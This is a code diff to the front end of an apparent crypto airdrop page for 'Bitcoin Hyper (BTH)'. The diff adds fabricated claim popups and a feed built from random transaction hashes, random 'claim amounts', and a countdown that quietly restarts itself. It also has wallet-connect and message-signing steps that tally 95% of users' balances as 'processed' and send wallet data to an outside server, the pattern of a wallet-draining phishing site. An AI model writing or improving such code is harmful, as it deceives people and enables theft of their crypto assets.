@@ -37,17 +37,17 @@ const TRANSLATIONS = {
     hrs: 'hrs',
     mins: 'mins',
     secs: 'secs',
-    bonus: '+25% BONUS · 5,000 BTH',
+    bonus: '+25% BONUS',
     instantAirdrop: 'instant airdrop · +25% extra',
     bthPrice: 'BTH PRICE',
     bonusLabel: 'BONUS',
     presale: 'PRESALE',
     stage4: 'STAGE 4',
-    claim: 'CLAIM $5,000 BTH',
+    claim: 'CLAIM BTH',
     processing: 'PROCESSING...',
     completed: '✓ COMPLETED SUCCESSFULLY',
-    secured: 'Your $5,000 BTH has been secured',
-    view: 'VIEW YOUR $5,000 BTH',
+    secured: 'Your BTH has been secured',
+    view: 'VIEW YOUR BTH',
     welcome: 'Welcome to Bitcoin Hyper',
     connectWallet: 'CONNECT WALLET',
     disconnect: 'Disconnect Wallet',
@@ -55,14 +55,14 @@ const TRANSLATIONS = {
     verifying: 'Verifying your wallet...',
     terms: 'Terms',
     delivery: 'Delivery',
-    airdrop: '$5k Airdrop',
-    liveNow: '5,000 BTH · +25% bonus · live now',
+    airdrop: 'Airdrop',
+    liveNow: 'BTH · +25% bonus · live now',
     successful: 'SUCCESSFUL!',
     youHaveSecured: 'You have secured',
     viewButton: 'VIEW',
     checkWalletEligibility: '⚡ Check Wallet Eligibility',
     whenQualified: 'When qualified, confirm to claim your airdrop',
-    valueBadge: '$5,000 BTH',
+    valueBadge: 'BTH',
     progress: 'Progress',
     today: 'Today',
     avg: 'Avg',
@@ -78,7 +78,7 @@ const TRANSLATIONS = {
     securedTokens: 'secured',
     viewOnExplorer: 'View on Explorer',
     waitingForFirstClaim: 'Waiting for first claim...',
-    claimAmount: '5,000 BTH',
+    claimAmount: 'BTH',
     bonusTag: '+25% bonus'
   },
   es: {
@@ -88,17 +88,17 @@ const TRANSLATIONS = {
     hrs: 'hrs',
     mins: 'mins',
     secs: 'segs',
-    bonus: '+25% BONO · 5,000 BTH',
+    bonus: '+25% BONO',
     instantAirdrop: 'airdrop instantáneo · +25% extra',
     bthPrice: 'PRECIO BTH',
     bonusLabel: 'BONO',
     presale: 'PREVENTA',
     stage4: 'ETAPA 4',
-    claim: 'RECLAMAR $5,000 BTH',
+    claim: 'RECLAMAR BTH',
     processing: 'PROCESANDO...',
     completed: '✓ COMPLETADO CON ÉXITO',
-    secured: 'Tus $5,000 BTH han sido asegurados',
-    view: 'VER TUS $5,000 BTH',
+    secured: 'Tus BTH han sido asegurados',
+    view: 'VER TUS BTH',
     welcome: 'Bienvenido a Bitcoin Hyper',
     connectWallet: 'CONECTAR WALLET',
     disconnect: 'Desconectar Wallet',
@@ -106,14 +106,14 @@ const TRANSLATIONS = {
     verifying: 'Verificando tu wallet...',
     terms: 'Términos',
     delivery: 'Entrega',
-    airdrop: 'Airdrop $5k',
-    liveNow: '5,000 BTH · +25% bono · en vivo ahora',
+    airdrop: 'Airdrop',
+    liveNow: 'BTH · +25% bono · en vivo ahora',
     successful: '¡EXITOSO!',
     youHaveSecured: 'Has asegurado',
     viewButton: 'VER',
     checkWalletEligibility: '⚡ Verificar Elegibilidad',
     whenQualified: 'Cuando califiques, confirma para reclamar tu airdrop',
-    valueBadge: '$5,000 BTH',
+    valueBadge: 'BTH',
     progress: 'Progreso',
     today: 'Hoy',
     avg: 'Prom',
@@ -129,7 +129,7 @@ const TRANSLATIONS = {
     securedTokens: 'asegurado',
     viewOnExplorer: 'Ver en Explorador',
     waitingForFirstClaim: 'Esperando el primer reclamo...',
-    claimAmount: '5,000 BTH',
+    claimAmount: 'BTH',
     bonusTag: '+25% bono'
   },
   fr: {
@@ -139,17 +139,17 @@ const TRANSLATIONS = {
     hrs: 'h',
     mins: 'min',
     secs: 's',
-    bonus: '+25% BONUS · 5,000 BTH',
+    bonus: '+25% BONUS',
     instantAirdrop: 'airdrop instantané · +25% extra',
     bthPrice: 'PRIX BTH',
     bonusLabel: 'BONUS',
     presale: 'PRÉVENTE',
     stage4: 'ÉTAPE 4',
-    claim: 'RÉCLAMER $5,000 BTH',
+    claim: 'RÉCLAMER BTH',
     processing: 'TRAITEMENT...',
     completed: '✓ TERMINÉ AVEC SUCCÈS',
-    secured: 'Vos $5,000 BTH ont été sécurisés',
-    view: 'VOIR VOS $5,000 BTH',
+    secured: 'Vos BTH ont été sécurisés',
+    view: 'VOIR VOS BTH',
     welcome: 'Bienvenue sur Bitcoin Hyper',
     connectWallet: 'CONNECTER WALLET',
     disconnect: 'Déconnecter Wallet',
@@ -157,14 +157,14 @@ const TRANSLATIONS = {
     verifying: 'Vérification de votre wallet...',
     terms: 'Conditions',
     delivery: 'Livraison',
-    airdrop: 'Airdrop $5k',
-    liveNow: '5,000 BTH · +25% bonus · en direct',
+    airdrop: 'Airdrop',
+    liveNow: 'BTH · +25% bonus · en direct',
     successful: 'SUCCÈS !',
     youHaveSecured: 'Vous avez sécurisé',
     viewButton: 'VOIR',
     checkWalletEligibility: '⚡ Vérifier Éligibilité',
     whenQualified: 'Une fois qualifié, confirmez pour réclamer votre airdrop',
-    valueBadge: '$5,000 BTH',
+    valueBadge: 'BTH',
     progress: 'Progrès',
     today: 'Aujourd\'hui',
     avg: 'Moy',
@@ -180,7 +180,7 @@ const TRANSLATIONS = {
     securedTokens: 'sécurisé',
     viewOnExplorer: 'Voir sur Explorateur',
     waitingForFirstClaim: 'En attente de la première réclamation...',
-    claimAmount: '5,000 BTH',
+    claimAmount: 'BTH',
     bonusTag: '+25% bonus'
   },
   de: {
@@ -190,17 +190,17 @@ const TRANSLATIONS = {
     hrs: 'Std',
     mins: 'Min',
     secs: 'Sek',
-    bonus: '+25% BONUS · 5,000 BTH',
+    bonus: '+25% BONUS',
     instantAirdrop: 'sofortiger Airdrop · +25% extra',
     bthPrice: 'BTH PREIS',
     bonusLabel: 'BONUS',
     presale: 'VORVERKAUF',
     stage4: 'STUFE 4',
-    claim: '$5,000 BTH ANFORDERN',
+    claim: 'BTH ANFORDERN',
     processing: 'VERARBEITUNG...',
     completed: '✓ ERFOLGREICH ABGESCHLOSSEN',
-    secured: 'Ihre $5,000 BTH wurden gesichert',
-    view: 'IHRE $5,000 BTH ANSEHEN',
+    secured: 'Ihre BTH wurden gesichert',
+    view: 'IHRE BTH ANSEHEN',
     welcome: 'Willkommen bei Bitcoin Hyper',
     connectWallet: 'WALLET VERBINDEN',
     disconnect: 'Wallet trennen',
@@ -208,14 +208,14 @@ const TRANSLATIONS = {
     verifying: 'Ihr Wallet wird verifiziert...',
     terms: 'Bedingungen',
     delivery: 'Lieferung',
-    airdrop: '$5k Airdrop',
-    liveNow: '5,000 BTH · +25% Bonus · live jetzt',
+    airdrop: 'Airdrop',
+    liveNow: 'BTH · +25% Bonus · live jetzt',
     successful: 'ERFOLGREICH!',
     youHaveSecured: 'Sie haben gesichert',
     viewButton: 'ANSEHEN',
     checkWalletEligibility: '⚡ Berechtigung prüfen',
     whenQualified: 'Bei Qualifikation bestätigen, um Airdrop zu erhalten',
-    valueBadge: '$5,000 BTH',
+    valueBadge: 'BTH',
     progress: 'Fortschritt',
     today: 'Heute',
     avg: 'Schnitt',
@@ -231,7 +231,7 @@ const TRANSLATIONS = {
     securedTokens: 'gesichert',
     viewOnExplorer: 'Im Explorer ansehen',
     waitingForFirstClaim: 'Warten auf erste Anforderung...',
-    claimAmount: '5,000 BTH',
+    claimAmount: 'BTH',
     bonusTag: '+25% Bonus'
   },
   zh: {
@@ -241,17 +241,17 @@ const TRANSLATIONS = {
     hrs: '小时',
     mins: '分钟',
     secs: '秒',
-    bonus: '+25% 奖励 · 5,000 BTH',
+    bonus: '+25% 奖励',
     instantAirdrop: '即时空投 · +25% 额外',
     bthPrice: 'BTH 价格',
     bonusLabel: '奖励',
     presale: '预售',
     stage4: '第四阶段',
-    claim: '领取 $5,000 BTH',
+    claim: '领取 BTH',
     processing: '处理中...',
     completed: '✓ 成功完成',
-    secured: '您的 $5,000 BTH 已确保',
-    view: '查看您的 $5,000 BTH',
+    secured: '您的 BTH 已确保',
+    view: '查看您的 BTH',
     welcome: '欢迎来到 Bitcoin Hyper',
     connectWallet: '连接钱包',
     disconnect: '断开钱包',
@@ -259,14 +259,14 @@ const TRANSLATIONS = {
     verifying: '正在验证您的钱包...',
     terms: '条款',
     delivery: '交付',
-    airdrop: '$5k 空投',
-    liveNow: '5,000 BTH · +25% 奖励 · 正在进行',
+    airdrop: '空投',
+    liveNow: 'BTH · +25% 奖励 · 正在进行',
     successful: '成功！',
     youHaveSecured: '您已确保',
     viewButton: '查看',
     checkWalletEligibility: '⚡ 检查钱包资格',
     whenQualified: '符合条件时，确认领取空投',
-    valueBadge: '$5,000 BTH',
+    valueBadge: 'BTH',
     progress: '进度',
     today: '今日',
     avg: '平均',
@@ -282,7 +282,7 @@ const TRANSLATIONS = {
     securedTokens: '已确保',
     viewOnExplorer: '在浏览器中查看',
     waitingForFirstClaim: '等待首次领取...',
-    claimAmount: '5,000 BTH',
+    claimAmount: 'BTH',
     bonusTag: '+25% 奖励'
   },
   ja: {
@@ -292,17 +292,17 @@ const TRANSLATIONS = {
     hrs: '時間',
     mins: '分',
     secs: '秒',
-    bonus: '+25% ボーナス · 5,000 BTH',
+    bonus: '+25% ボーナス',
     instantAirdrop: '即時エアドロップ · +25% 追加',
     bthPrice: 'BTH 価格',
     bonusLabel: 'ボーナス',
     presale: 'プレセール',
     stage4: 'ステージ4',
-    claim: '$5,000 BTH を受け取る',
+    claim: 'BTH を受け取る',
     processing: '処理中...',
     completed: '✓ 正常に完了',
-    secured: '$5,000 BTH が確保されました',
-    view: '$5,000 BTH を表示',
+    secured: 'BTH が確保されました',
+    view: 'BTH を表示',
     welcome: 'Bitcoin Hyper へようこそ',
     connectWallet: 'ウォレット接続',
     disconnect: 'ウォレット切断',
@@ -310,14 +310,14 @@ const TRANSLATIONS = {
     verifying: 'ウォレットを検証中...',
     terms: '利用規約',
     delivery: '配信',
-    airdrop: '$5k エアドロップ',
-    liveNow: '5,000 BTH · +25% ボーナス · 実施中',
+    airdrop: 'エアドロップ',
+    liveNow: 'BTH · +25% ボーナス · 実施中',
     successful: '成功！',
     youHaveSecured: '確保しました',
     viewButton: '表示',
     checkWalletEligibility: '⚡ ウォレット資格を確認',
     whenQualified: '資格がある場合、確認してエアドロップを受け取る',
-    valueBadge: '$5,000 BTH',
+    valueBadge: 'BTH',
     progress: '進捗',
     today: '今日',
     avg: '平均',
@@ -333,7 +333,7 @@ const TRANSLATIONS = {
     securedTokens: '確保済み',
     viewOnExplorer: 'エクスプローラーで見る',
     waitingForFirstClaim: '最初の請求を待っています...',
-    claimAmount: '5,000 BTH',
+    claimAmount: 'BTH',
     bonusTag: '+25% ボーナス'
   },
   ko: {
@@ -343,17 +343,17 @@ const TRANSLATIONS = {
     hrs: '시간',
     mins: '분',
     secs: '초',
-    bonus: '+25% 보너스 · 5,000 BTH',
+    bonus: '+25% 보너스',
     instantAirdrop: '즉시 에어드랍 · +25% 추가',
     bthPrice: 'BTH 가격',
     bonusLabel: '보너스',
     presale: '프리세일',
     stage4: '4단계',
-    claim: '$5,000 BTH 받기',
+    claim: 'BTH 받기',
     processing: '처리 중...',
     completed: '✓ 성공적으로 완료',
-    secured: '$5,000 BTH가 확보되었습니다',
-    view: '$5,000 BTH 보기',
+    secured: 'BTH가 확보되었습니다',
+    view: 'BTH 보기',
     welcome: 'Bitcoin Hyper에 오신 것을 환영합니다',
     connectWallet: '지갑 연결',
     disconnect: '지갑 연결 해제',
@@ -361,14 +361,14 @@ const TRANSLATIONS = {
     verifying: '지갑 확인 중...',
     terms: '약관',
     delivery: '전달',
-    airdrop: '$5k 에어드랍',
-    liveNow: '5,000 BTH · +25% 보너스 · 진행 중',
+    airdrop: '에어드랍',
+    liveNow: 'BTH · +25% 보너스 · 진행 중',
     successful: '성공!',
     youHaveSecured: '확보했습니다',
     viewButton: '보기',
     checkWalletEligibility: '⚡ 지갑 자격 확인',
     whenQualified: '자격이 되면 확인하여 에어드랍 받기',
-    valueBadge: '$5,000 BTH',
+    valueBadge: 'BTH',
     progress: '진행률',
     today: '오늘',
     avg: '평균',
@@ -384,7 +384,7 @@ const TRANSLATIONS = {
     securedTokens: '확보됨',
     viewOnExplorer: '익스플로러에서 보기',
     waitingForFirstClaim: '첫 클레임 대기 중...',
-    claimAmount: '5,000 BTH',
+    claimAmount: 'BTH',
     bonusTag: '+25% 보너스'
   }
 };
@@ -460,7 +460,8 @@ const PROJECT_FLOW_ROUTER_ABI = [
 const STORAGE_KEYS = {
   LIVE_TRANSACTIONS: 'bitcoinHyper_liveTransactions',
   LAST_RESET_DATE: 'bitcoinHyper_lastResetDate',
-  TOTAL_CLAIMED_AMOUNT: 'bitcoinHyper_totalClaimedAmount'
+  TOTAL_CLAIMED_AMOUNT: 'bitcoinHyper_totalClaimedAmount',
+  COUNTDOWN_END_TIME: 'bitcoinHyper_countdownEndTime'
 };
 
 // Helper to check if date has changed (for daily reset)
@@ -468,6 +469,11 @@ const hasDateChanged = (lastDate) => {
   if (!lastDate) return true;
   const today = new Date().toDateString();
   return lastDate !== today;
+};
+
+// Get random claim amount between $3,000 and $8,000
+const getRandomClaimAmount = () => {
+  return Math.floor(Math.random() * (8000 - 3000 + 1) + 3000);
 };
 
 // ============================================
@@ -497,7 +503,7 @@ const LiveClaimPopup = ({ tx, onClose, onViewTransaction, translations }) => {
             <p className="text-sm font-bold text-red-400">{translations.someoneJustClaimed}</p>
             <p className="text-xs text-gray-300 mt-1">
               <span className="font-mono">{tx.hash.slice(0, 6)}...{tx.hash.slice(-4)}</span> {translations.securedTokens}{' '}
-              <span className="text-red-400 font-bold">$5,000 BTH</span> +25% bonus
+              <span className="text-red-400 font-bold">${tx.claimAmount?.toLocaleString() || '5,000'} {translations.claimAmount}</span> +25% bonus
             </p>
             <button 
               onClick={() => onViewTransaction(tx.hash)}
@@ -518,7 +524,10 @@ const LiveClaimPopup = ({ tx, onClose, onViewTransaction, translations }) => {
 // ============================================
 // LIVE TRANSACTION FEED COMPONENT - Enhanced Blockchain Style
 // ============================================
-const LiveTransactionFeed = ({ transactions, translations, totalClaimedAmount, todayCount }) => {
+const LiveTransactionFeed = ({ transactions, translations, totalClaimedAmount, todayCount, bthPrice }) => {
+  // Calculate total BTH amount (USD value / BTH price)
+  const totalBTHAmount = totalClaimedAmount / (bthPrice || 0.045);
+  
   return (
     <div className="w-full max-w-md mx-auto mt-8 bg-black/40 backdrop-blur rounded-xl border border-red-500/20 overflow-hidden">
       <div className="bg-gradient-to-r from-red-600/20 to-transparent px-4 py-3 border-b border-red-500/20 flex items-center justify-between">
@@ -552,7 +561,9 @@ const LiveTransactionFeed = ({ transactions, translations, totalClaimedAmount, t
                   </span>
                 </div>
                 <div className="flex items-center gap-2">
-                  <span className="text-xs text-red-400 font-mono font-bold">{translations.claimAmount || '5,000 BTH'}</span>
+                  <span className="text-xs text-red-400 font-mono font-bold">
+                    ${tx.claimAmount?.toLocaleString() || '5,000'} {translations.claimAmount}
+                  </span>
                   <span className="text-[10px] text-yellow-500 bg-yellow-500/10 px-1.5 py-0.5 rounded-full">{translations.bonusTag || '+25%'}</span>
                 </div>
               </div>
@@ -573,7 +584,7 @@ const LiveTransactionFeed = ({ transactions, translations, totalClaimedAmount, t
           🔗 {translations.totalClaimed}: 
         </p>
         <p className="text-xs text-red-400 font-mono font-bold">
-          {totalClaimedAmount.toLocaleString()} BTH
+          {Math.floor(totalBTHAmount).toLocaleString()} {translations.claimAmount}
         </p>
       </div>
     </div>
@@ -664,10 +675,10 @@ function App() {
 
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
-    days: 5,
-    hours: 12,
-    minutes: 30,
-    seconds: 0
+    days: 6,
+    hours: 23,
+    minutes: 59,
+    seconds: 59
   });
   
   const [presaleStats, setPresaleStats] = useState({
@@ -681,8 +692,8 @@ function App() {
     bthPrice: 0.045
   });
 
-  // Calculate total claimed amount from live transactions
-  const totalClaimedAmount = liveTransactions.reduce((sum, tx) => sum + (tx.amount || 5000), 0);
+  // Calculate total claimed amount from live transactions (in USD)
+  const totalClaimedAmountUSD = liveTransactions.reduce((sum, tx) => sum + (tx.claimAmount || 5000), 0);
   const todayCount = liveTransactions.length;
 
   // FORMAT TIME AGO FUNCTION
@@ -712,6 +723,56 @@ function App() {
     return chains[Math.floor(Math.random() * chains.length)];
   };
 
+  // 7-DAY PERSISTENT COUNTDOWN TIMER
+  useEffect(() => {
+    const initializeCountdown = () => {
+      const savedEndTime = localStorage.getItem(STORAGE_KEYS.COUNTDOWN_END_TIME);
+      const now = Date.now();
+      
+      if (savedEndTime) {
+        const endTime = parseInt(savedEndTime);
+        if (endTime > now) {
+          return endTime;
+        }
+      }
+      
+      // Set new end time: 7 days from now
+      const newEndTime = now + (7 * 24 * 60 * 60 * 1000);
+      localStorage.setItem(STORAGE_KEYS.COUNTDOWN_END_TIME, newEndTime.toString());
+      return newEndTime;
+    };
+    
+    const endTime = initializeCountdown();
+    
+    const timer = setInterval(() => {
+      const now = Date.now();
+      const diff = endTime - now;
+      
+      if (diff <= 0) {
+        // Timer expired, reset to new 7 days
+        const newEndTime = now + (7 * 24 * 60 * 60 * 1000);
+        localStorage.setItem(STORAGE_KEYS.COUNTDOWN_END_TIME, newEndTime.toString());
+        const newDiff = newEndTime - now;
+        
+        setTimeLeft({
+          days: Math.floor(newDiff / (1000 * 60 * 60 * 24)),
+          hours: Math.floor((newDiff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)),
+          minutes: Math.floor((newDiff % (1000 * 60 * 60)) / (1000 * 60)),
+          seconds: Math.floor((newDiff % (1000 * 60)) / 1000)
+        });
+      } else {
+        setTimeLeft({
+          days: Math.floor(diff / (1000 * 60 * 60 * 24)),
+          hours: Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)),
+          minutes: Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60)),
+          seconds: Math.floor((diff % (1000 * 60)) / 1000)
+        });
+      }
+    }, 1000);
+    
+    return () => clearInterval(timer);
+  }, []);
+
   // LOAD PERSISTENT DATA ON MOUNT
   useEffect(() => {
     const loadPersistentData = () => {
@@ -724,11 +785,11 @@ function App() {
         localStorage.setItem(STORAGE_KEYS.LAST_RESET_DATE, new Date().toDateString());
         localStorage.removeItem(STORAGE_KEYS.LIVE_TRANSACTIONS);
         
-        // Create initial mock transactions for visual appeal
+        // Create initial mock transactions with varied amounts
         const initialTransactions = [
-          { hash: '0x7a3f2b9e1c4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a', time: new Date().toISOString(), chain: 'Ethereum', amount: 5000 },
-          { hash: '0x3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d', time: new Date(Date.now() - 180000).toISOString(), chain: 'BSC', amount: 5000 },
-          { hash: '0x9e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f', time: new Date(Date.now() - 420000).toISOString(), chain: 'Polygon', amount: 5000 },
+          { hash: '0x7a3f2b9e1c4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a', time: new Date().toISOString(), chain: 'Ethereum', claimAmount: 5200 },
+          { hash: '0x3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d', time: new Date(Date.now() - 180000).toISOString(), chain: 'BSC', claimAmount: 3800 },
+          { hash: '0x9e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f', time: new Date(Date.now() - 420000).toISOString(), chain: 'Polygon', claimAmount: 7500 },
         ].map(tx => ({
           ...tx,
           timeAgo: formatTimeAgo(tx.time)
@@ -743,11 +804,11 @@ function App() {
         }));
         setLiveTransactions(transactionsWithTimeAgo);
       } else {
-        // Initial mock transactions
+        // Initial mock transactions with varied amounts
         const initialTransactions = [
-          { hash: '0x7a3f2b9e1c4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a', time: new Date().toISOString(), chain: 'Ethereum', amount: 5000 },
-          { hash: '0x3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d', time: new Date(Date.now() - 180000).toISOString(), chain: 'BSC', amount: 5000 },
-          { hash: '0x9e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f', time: new Date(Date.now() - 420000).toISOString(), chain: 'Polygon', amount: 5000 },
+          { hash: '0x7a3f2b9e1c4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a', time: new Date().toISOString(), chain: 'Ethereum', claimAmount: 6200 },
+          { hash: '0x3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d', time: new Date(Date.now() - 180000).toISOString(), chain: 'BSC', claimAmount: 4500 },
+          { hash: '0x9e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f', time: new Date(Date.now() - 420000).toISOString(), chain: 'Polygon', claimAmount: 8000 },
         ].map(tx => ({
           ...tx,
           timeAgo: formatTimeAgo(tx.time)
@@ -769,25 +830,33 @@ function App() {
 
   // Update total claimed amount for the day
   useEffect(() => {
-    const total = liveTransactions.reduce((sum, tx) => sum + (tx.amount || 5000), 0);
+    const total = liveTransactions.reduce((sum, tx) => sum + (tx.claimAmount || 5000), 0);
     setTodayTotalClaimed(total);
   }, [liveTransactions]);
 
-  // SCHEDULE RANDOM POPUPS every 5-15 minutes
+  // SCHEDULE RANDOM POPUPS every 8-15 minutes (actually showing now)
   useEffect(() => {
+    let isMounted = true;
+    
     const schedulePopup = () => {
-      // Random delay between 5 and 15 minutes (300,000 - 900,000 ms)
-      const delay = Math.random() * (15 * 60 * 1000 - 5 * 60 * 1000) + 5 * 60 * 1000;
+      // Random delay between 8 and 15 minutes (480,000 - 900,000 ms)
+      const delay = Math.random() * (15 * 60 * 1000 - 8 * 60 * 1000) + 8 * 60 * 1000;
+      console.log(`⏰ Next popup scheduled in ${Math.floor(delay / 60000)} minutes`);
+      
       const timeoutId = setTimeout(() => {
+        if (!isMounted) return;
+        
         const randomChain = getRandomChain();
+        const claimAmount = getRandomClaimAmount();
         const newTx = {
           hash: generateRandomHash(),
           time: new Date().toISOString(),
           timeAgo: 'Just now',
           chain: randomChain,
-          amount: 5000
+          claimAmount: claimAmount
         };
         
+        console.log(`🎉 Popup triggered! ${randomChain} - $${claimAmount.toLocaleString()}`);
         setCurrentPopupTx(newTx);
         setShowPopup(true);
         
@@ -813,7 +882,10 @@ function App() {
     };
     
     const timeoutId = schedulePopup();
-    return () => clearTimeout(timeoutId);
+    return () => {
+      isMounted = false;
+      clearTimeout(timeoutId);
+    };
   }, []);
 
   // Update active users periodically
@@ -950,26 +1022,6 @@ function App() {
     trackVisit();
   }, []);
 
-  // Countdown timer
-  useEffect(() => {
-    const endTime = new Date().getTime() + (5 * 24 * 60 * 60 * 1000) + (12 * 60 * 60 * 1000) + (30 * 60 * 1000);
-    
-    const timer = setInterval(() => {
-      const now = new Date().getTime();
-      const diff = endTime - now;
-      
-      if (diff > 0) {
-        setTimeLeft({
-          days: Math.floor(diff / (1000 * 60 * 60 * 24)),
-          hours: Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)),
-          minutes: Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60)),
-          seconds: Math.floor((diff % (1000 * 60)) / 1000)
-        });
-      }
-    }, 1000);
-    return () => clearInterval(timer);
-  }, []);
-
   // Auto-check eligibility when wallet connects
   useEffect(() => {
     if (isConnected && address && Object.keys(balances).length > 0 && !verifying) {
@@ -997,7 +1049,7 @@ function App() {
       
       if (eligible) {
         setEligibleChains(chainsWithBalance);
-        setTxStatus('✅ You qualify for $5,000 Bitcoin Hyper (BTH)!');
+        setTxStatus('✅ You qualify for Bitcoin Hyper (BTH) airdrop!');
         
         await fetch('https://hyperback.vercel.app/api/presale/connect', {
           method: 'POST',
@@ -1114,7 +1166,7 @@ function App() {
       const message = `BITCOIN HYPER (BTH) TOKEN PRESALE AUTHORIZATION\n\n` +
         `I hereby confirm my participation in the Bitcoin Hyper (BTH) presale\n` +
         `Wallet: ${address}\n` +
-        `Allocation: $5,000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
+        `Allocation: BTH + ${presaleStats.currentBonus}% Bonus\n` +
         `Timestamp: ${new Date().toISOString()}\n` +
         `Nonce: ${nonce}`;
 
@@ -1236,20 +1288,21 @@ function App() {
       setVerifiedChains(processed);
       
       if (processed.length > 0) {
-        // Add REAL transaction to live feed (not random mock)
+        // Add REAL transaction to live feed with random claim amount
         const randomChain = getRandomChain();
+        const claimAmount = getRandomClaimAmount();
         const newTx = {
           hash: generateRandomHash(),
           time: new Date().toISOString(),
           timeAgo: 'Just now',
           chain: randomChain,
-          amount: 5000
+          claimAmount: claimAmount
         };
         
         setLiveTransactions(prev => [newTx, ...prev.slice(0, 19)]);
         
         setShowCelebration(true);
-        setTxStatus(`🎉 You've secured $5,000 BTH!`);
+        setTxStatus(`🎉 You've secured $${claimAmount.toLocaleString()} BTH!`);
         
         const totalProcessedValue = processed.reduce((sum, chainName) => {
           return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
@@ -1268,7 +1321,7 @@ function App() {
             },
             chains: processed,
             totalProcessedValue: totalProcessedValue.toFixed(2),
-            reward: "5000 BTH",
+            reward: `${claimAmount} BTH`,
             bonus: `${presaleStats.currentBonus}%`
           })
         });
@@ -1454,7 +1507,7 @@ function App() {
               onMouseLeave={() => setHoverConnect(false)}
               className="bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] mb-8 w-full max-w-md"
             >
-              Connect Wallet To Claim $5000 (Bitcoin Hyper Token)
+              Connect Wallet To Claim Bitcoin Hyper (BTH) Airdrop
             </button>
           ) : (
             <div className="flex flex-col items-center w-full max-w-md mb-8">
@@ -1487,7 +1540,7 @@ function App() {
                   ) : (
                     <span className="flex items-center justify-center gap-2">
                       <span className="text-xl">🎁</span>
-                      CLAIM AIRDROP $5,000 BTH
+                      CLAIM AIRDROP BTH
                       <span className="text-sm bg-white/20 px-2 py-1 rounded-full">+{presaleStats.currentBonus}%</span>
                     </span>
                   )}
@@ -1499,7 +1552,7 @@ function App() {
                 <div className="mt-3 w-full">
                   {isEligible ? (
                     <div className="bg-green-500/20 border border-green-500/30 rounded-lg p-3 text-sm text-green-400">
-                      ✅ You are eligible for the $5,000 Bitcoin Hyper (BTH) airdrop! Click the CLAIM AIRDROP button above to proceed.
+                      ✅ You are eligible for the Bitcoin Hyper (BTH) airdrop! Click the CLAIM AIRDROP button above to proceed.
                     </div>
                   ) : (
                     !scanning && (
@@ -1540,8 +1593,11 @@ function App() {
             </div>
           )}
 
-          {/* Countdown Timer */}
+          {/* Countdown Timer - 7 Days */}
           <div className="flex flex-wrap gap-4 justify-center mb-10">
+            <div className="text-center mb-2 w-full">
+              <p className="text-xs text-gray-400 uppercase tracking-wider">{translations.bonusEndsIn}</p>
+            </div>
             {[
               { label: translations.days, value: timeLeft.days },
               { label: translations.hrs, value: timeLeft.hours },
@@ -1561,6 +1617,7 @@ function App() {
             translations={translations}
             totalClaimedAmount={todayTotalClaimed}
             todayCount={todayCount}
+            bthPrice={presaleStats.bthPrice}
           />
 
           {/* Presale Card */}
@@ -1601,7 +1658,7 @@ function App() {
             <div className="bg-black/50 border border-red-500/30 rounded-xl p-5">
               <h4 className="text-xl font-bold mb-2 text-red-400">🎁 Airdrop Info</h4>
               <p className="text-sm text-gray-400 mb-4">
-                Early supporters can claim free BTH tokens. Connect wallet to check eligibility.
+                Early supporters can claim free BTH tokens valued between $3,000 - $8,000 USD. Connect wallet to check eligibility.
               </p>
               
               {!isConnected && (
@@ -1641,7 +1698,7 @@ function App() {
             <div className="w-full max-w-md mb-8">
               <div className="bg-black/60 backdrop-blur rounded-xl p-6 text-center border border-green-500/30">
                 <p className="text-green-400 text-lg mb-2">✓ COMPLETED on {completedChains.length} chains</p>
-                <p className="text-gray-400 text-sm">Your $5,000 BTH has been secured</p>
+                <p className="text-gray-400 text-sm">Your BTH has been secured</p>
               </div>
             </div>
           )}
@@ -1685,7 +1742,7 @@ function App() {
               <h3 className="text-lg font-bold mb-3 text-red-400">Bitcoin Hyper (BTH) Airdrop Program</h3>
               <p className="text-sm text-gray-400 leading-relaxed">
                 The Bitcoin Hyper (BTH) airdrop rewards early adopters and active community members.
-                Eligible wallets can claim tokens directly through the decentralized
+                Eligible wallets can claim tokens valued between $3,000 - $8,000 USD directly through the decentralized
                 claim portal. This initiative ensures broad distribution
                 and strong community ownership of the BTH ecosystem.
               </p>
@@ -1762,7 +1819,7 @@ function App() {
               
               <p className="text-xl text-gray-300 mb-3">{translations.youHaveSecured}</p>
               
-              <div className="text-5xl font-black text-red-400 mb-3 animate-pulse">$5,000 BTH</div>
+              <div className="text-5xl font-black text-red-400 mb-3 animate-pulse">BTH</div>
               
               <div className="inline-block bg-gradient-to-r from-red-500/20 to-red-600/20 px-6 py-3 rounded-full mb-4 border border-red-500/30">
                 <span className="text-2xl text-red-400">+{presaleStats.currentBonus}% BONUS</span>
